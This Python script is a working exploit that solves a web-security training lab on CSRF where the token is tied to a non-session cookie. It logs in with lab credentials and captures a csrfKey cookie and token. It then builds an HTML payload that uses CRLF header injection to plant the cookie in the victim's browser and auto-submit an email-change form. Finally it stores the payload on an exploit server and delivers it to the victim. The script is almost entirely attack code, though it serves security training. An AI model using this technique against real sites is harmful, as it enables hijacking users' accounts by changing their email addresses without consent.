import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    csrf_token = extract_csrf(r)
    return csrf_token


def extract_csrf(r):
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {"name":"csrf"})["value"]
    return csrf_token


def csrf_attack(s, url, exploit_server):
    # URLs
    login_url = url + '/login'
    myaccount_url = url + '/my-account'

    # LOGIN AS USER WIENER
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }

    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    # IF LOGIN UNSUCCESSFUL, STOPS
    if "wiener" not in r.text:
        print("[-] Could not log-in")
        sys.exit(-1)
    
    # EXTRACT ASSIGNED CSRFKEY COOKIE AND CSRF TOKEN FROM CHANGE EMAIL FORM
    csrfKey_cookie = s.cookies.get_dict()['csrfKey']
    csrf_token = extract_csrf(r)

    # STORE PAYLOAD ON EXPLOIT SERVER
    payload = """<html>
    <body>
        <img src=" {0}/?search=test%0d%0aSet-Cookie:%20csrfKey={1}%3b%20SameSite=None" onerror="document.forms[0].submit()">
        <form action="{0}/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@gothacked">
            <input required type="hidden" name="csrf" value="{2}">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>""".format(url, csrfKey_cookie, csrf_token)
    
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/exploit',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }

    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not store the payload")
        sys.exit(-1)

    # DELIVER PAYLOAD TO VICTIM
    params['formAction'] = 'DELIVER_TO_VICTIM'
    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not deliver payload to victim")
        sys.exit(-1)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Lab solved! Exploit successful!")

def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.vulnerable-website.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()
    s = requests.Session()

    print("[+] Lab: CSRF where token is tied to non-session cookie")
    print("""[+] This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
    To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
wiener:peter
carlos:montoya
""")
    
    csrf_attack(s, url, exploit_server)

if __name__ == "__main__":
    main()